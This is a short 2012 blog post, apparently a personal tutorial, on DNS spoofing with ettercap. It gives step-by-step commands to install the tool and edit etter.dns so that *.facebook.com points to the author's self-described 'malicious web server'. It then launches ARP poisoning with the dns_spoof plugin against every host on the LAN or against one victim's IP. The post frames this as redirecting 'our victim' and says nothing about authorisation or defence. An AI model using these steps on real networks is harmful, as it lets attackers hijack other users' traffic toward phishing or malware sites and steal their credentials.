---
title: "HACK : Playing DNS Spoofing with Ettercap"
date: 2012-09-07 10:17:00 +07:00
categories:
- Archive
tags:
- Networking
- Linux
- Server
layout: post
toc: true
---

Before sleep, I want to play with some tutorial on the net. It's about DNS spoofing, and used ettercap to do it! First, you must have ettercap installed on your computer. To download ettercap, type

> **sudo apt-get install ettercap-graphical**

Now lets redirect our victim to websites of our choosing. First open a new console and change to our dns configuration file located in the following directory:

> **/usr/share/ettercap**

Enter the following command to open the configuration file so we can edit it, I use gedit to edit it but you can use many other programs such as kedit:

> **gedit etter.dns**

Now see the line that says microsoft.com A 198.182.196.56

That line will redirect the victim to 198.182.196.56 if they attempt to visit microsoft.com

I will give you an example by showing you I can redirect the victim to my own malicious web server running on my IP address (192.168.1.118) if they attempt to visit lets say [http://www.facebook.com](http://www.facebook.com/) This example also uses a wildcard (\*)We do this by adding the following line:

> **\*.facebook.com A 192.168.1.118**

Save it. Now We can issue the actual command that begins Ettercap and uses the dns spoofing addon:

> **ettercap -T -q -M arp:remote -P dns_spoof //**

or if we want to target a specific victim IP address use this:

> **ettercap -i yourinterface -T -q -P dns_spoof -M ARP /herevictimslocalip/ //**

Leave that running. The output that ettercap displays will clearly notify you as people are redirected.
